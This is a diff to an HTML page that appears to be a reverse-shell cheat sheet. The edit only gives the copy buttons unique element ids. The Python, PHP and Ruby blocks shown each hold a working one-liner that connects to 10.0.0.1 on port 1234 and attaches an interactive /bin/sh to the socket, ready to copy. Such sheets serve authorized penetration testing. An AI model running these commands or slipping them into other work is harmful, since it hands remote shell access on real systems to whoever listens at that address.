@@ -145,12 +145,12 @@
 </code></pre></div><p> </p>
 <h2 id="python">Python</h2>
 <p> </p>
-<div id="to-copy" class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python -c <span style="color:#e6db74">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
-</code><button onClick="CopyToClipboard('to-copy')">Copy</button></pre></div><p> </p>
+<div id="to-copy1" class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python -c <span style="color:#e6db74">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
+</code><button onClick="CopyToClipboard('to-copy1')">Copy</button></pre></div><p> </p>
 <h2 id="php">PHP</h2>
 <p> </p>
-<div id="to-copy" class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">php -r <span style="color:#e6db74">&#39;$sock=fsockopen(&#34;10.0.0.1&#34;,1234);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
-</code><button onClick="CopyToClipboard('to-copy')">Copy</button></pre></div><p> </p>
+<div id="to-copy2" class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">php -r <span style="color:#e6db74">&#39;$sock=fsockopen(&#34;10.0.0.1&#34;,1234);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
+</code><button onClick="CopyToClipboard('to-copy2')">Copy</button></pre></div><p> </p>
 <h2 id="ruby">Ruby</h2>
 <p> </p>
 <div id="to-copy" class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ruby -rsocket -e<span style="color:#e6db74">&#39;f=TCPSocket.open(&#34;10.0.0.1&#34;,1234).to_i;exec sprintf(&#34;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&#34;,f,f,f)&#39;</span>
